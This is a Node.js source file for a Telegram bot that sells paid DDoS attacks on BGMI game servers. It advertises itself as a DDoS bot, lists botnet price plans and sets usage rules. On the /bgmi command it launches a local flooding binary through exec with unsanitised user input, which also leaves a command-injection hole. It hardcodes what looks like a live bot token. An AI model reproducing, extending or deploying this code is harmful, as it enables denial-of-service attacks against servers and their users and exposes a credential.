const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

// Insert your Telegram bot token here
const token = '6928006374:AAH5gudHAogy1jzx4_8Z1quh-iQePupBOQc';
const bot = new TelegramBot(token, { polling: true });

// Admin user IDs
const adminIds = ['5676702497'];

// File to store allowed user IDs
const USER_FILE = 'users.txt';

// File to store command logs
const LOG_FILE = 'log.txt';

// Function to read user IDs from the file
const readUsers = () => {
  try {
    const data = fs.readFileSync(USER_FILE, 'utf8');
    return data.split('\n').filter(Boolean);
  } catch (err) {
    return [];
  }
};

// List to store allowed user IDs
let allowedUserIds = readUsers();

// Function to log command to the file
const logCommand = (userId, target, port, time) => {
  const chatPromise = bot.getChat(userId);
  chatPromise.then(userInfo => {
    const username = userInfo.username ? `@${userInfo.username}` : `UserID: ${userId}`;
    const logEntry = `Username: ${username}\nTarget: ${target}\nPort: ${port}\nTime: ${time}\n\n`;
    fs.appendFileSync(LOG_FILE, logEntry, 'utf8');
  });
};

// Function to clear logs
const clearLogs = () => {
  try {
    if (fs.existsSync(LOG_FILE) && fs.readFileSync(LOG_FILE, 'utf8').trim() === '') {
      return 'Logs are already cleared. No data found.';
    } else {
      fs.truncateSync(LOG_FILE, 0);
      return 'Logs cleared successfully';
    }
  } catch (err) {
    return 'No logs found to clear.';
  }
};

// Command handlers
bot.onText(/\/add (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    const userToAdd = match[1];
    if (!allowedUserIds.includes(userToAdd)) {
      allowedUserIds.push(userToAdd);
      fs.appendFileSync(USER_FILE, `${userToAdd}\n`, 'utf8');
      bot.sendMessage(msg.chat.id, `User ${userToAdd} added successfully.`);
    } else {
      bot.sendMessage(msg.chat.id, 'User already exists.');
    }
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.onText(/\/remove (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    const userToRemove = match[1];
    const index = allowedUserIds.indexOf(userToRemove);
    if (index !== -1) {
      allowedUserIds.splice(index, 1);
      fs.writeFileSync(USER_FILE, allowedUserIds.join('\n') + '\n', 'utf8');
      bot.sendMessage(msg.chat.id, `User ${userToRemove} removed successfully.`);
    } else {
      bot.sendMessage(msg.chat.id, `User ${userToRemove} not found in the list.`);
    }
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.onText(/\/clearlogs/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    const response = clearLogs();
    bot.sendMessage(msg.chat.id, response);
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.onText(/\/allusers/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    try {
      const userIds = readUsers();
      if (userIds.length > 0) {
        let response = 'Authorized Users:\n';
        userIds.forEach(async userId => {
          try {
            const userInfo = await bot.getChat(userId);
            const username = userInfo.username || `UserID: ${userId}`;
            response += `- @${username} (ID: ${userId})\n`;
          } catch (e) {
            response += `- User ID: ${userId}\n`;
          }
        });
        bot.sendMessage(msg.chat.id, response);
      } else {
        bot.sendMessage(msg.chat.id, 'No data found.');
      }
    } catch (err) {
      bot.sendMessage(msg.chat.id, 'No data found.');
    }
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.onText(/\/logs/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    if (fs.existsSync(LOG_FILE) && fs.statSync(LOG_FILE).size > 0) {
      bot.sendDocument(msg.chat.id, LOG_FILE);
    } else {
      bot.sendMessage(msg.chat.id, 'No data found.');
    }
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.onText(/\/id/, (msg) => {
  const userId = msg.chat.id.toString();
  bot.sendMessage(msg.chat.id, `Your ID: ${userId}`);
});

bot.onText(/\/bgmi (.+) (.+) (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (allowedUserIds.includes(userId)) {
    const target = match[1];
    const port = parseInt(match[2]);
    const time = parseInt(match[3]);
    if (time > 5000) {
      bot.sendMessage(msg.chat.id, 'Error: Time interval must be less than 5000.');
    } else {
      logCommand(userId, target, port, time);
      const userInfo = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
      const response = `${userInfo}, ATTACK STARTED.\n\nTarget: ${target}\nPort: ${port}\nTime: ${time} Seconds\nMethod: BGMI\nBy Indian Watchdogs @Indian_Hackers_Team`;
      bot.sendMessage(msg.chat.id, response);
      const fullCommand = `./bgmi ${target} ${port} ${time} 500`;
      exec(fullCommand, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(msg.chat.id, `Error: ${stderr}`);
        } else {
          bot.sendMessage(msg.chat.id, `BGMI Attack Finished. Target: ${target} Port: ${port} Time: ${time}`);
        }
      });
    }
  } else {
    bot.sendMessage(msg.chat.id, 'You are not authorized to use this command.\nBy Indian Watchdogs @Indian_Hackers_Team');
  }
});

bot.onText(/\/mylogs/, (msg) => {
  const userId = msg.chat.id.toString();
  if (allowedUserIds.includes(userId)) {
    try {
      const commandLogs = fs.readFileSync(LOG_FILE, 'utf8').split('\n');
      const userLogs = commandLogs.filter(log => log.includes(`UserID: ${userId}`));
      if (userLogs.length > 0) {
        const response = 'Your Command Logs:\n' + userLogs.join('\n');
        bot.sendMessage(msg.chat.id, response);
      } else {
        bot.sendMessage(msg.chat.id, 'No command logs found for you.');
      }
    } catch (err) {
      bot.sendMessage(msg.chat.id, 'No command logs found.');
    }
  } else {
    bot.sendMessage(msg.chat.id, 'You are not authorized to use this command.');
  }
});

bot.onText(/\/help/, (msg) => {
  const helpText = `Available commands:
  /bgmi : Method For BGMI Servers.
  /rules : Please check before use.
  /mylogs : To check your recent attacks.
  /plan : Checkout our botnet rates.

  To see admin commands:
  /admincmd : Shows all admin commands.
  By Indian Watchdogs @Indian_Hackers_Team
  `;
  bot.sendMessage(msg.chat.id, helpText);
});

bot.onText(/\/start/, (msg) => {
  const userName = msg.from.first_name;
  const response = `Welcome to Your Home, ${userName}! Feel free to explore.\nTry to run this command: /help\nWelcome to the World's Best DDoS Bot\nBy Indian Watchdogs @Indian_Hackers_Team`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/rules/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName} Please Follow These Rules:

1. Don't run too many attacks!! Causes a ban from the bot.
2. Don't run 2 attacks at the same time because if you do, you'll get banned from the bot.
3. We daily check the logs so follow these rules to avoid a ban!!
By Indian Watchdogs @Indian_Hackers_Team`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/plan/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName}, Brother only 1 plan is powerful than any other DDoS!!:

Vip :
-> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Price List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs
By Indian Watchdogs @Indian_Hackers_Team`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/admincmd/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName}, Admin Commands Are Here!!:

/add <userId> : Add a user.
/remove <userId> : Remove a user.
/allusers : Authorized users list.
/logs : All users logs.
/broadcast : Broadcast a message.
/clearlogs : Clear the logs file.
By Indian Watchdogs @Indian_Hackers_Team`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/broadcast (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminIds.includes(userId)) {
    const messageToBroadcast = `Message to All Users By Admin:\n\n${match[1]}`;
    const userIds = readUsers();
    userIds.forEach(userId => {
      bot.sendMessage(userId, messageToBroadcast).catch(err => console.log(`Failed to send broadcast message to user ${userId}: ${err.message}`));
    });
    bot.sendMessage(msg.chat.id, 'Broadcast message sent successfully to all users.');
  } else {
    bot.sendMessage(msg.chat.id, 'Only Admin can run this command.');
  }
});

bot.on('polling_error', (error) => {
  console.log(error.code);  // => 'EFATAL'
});
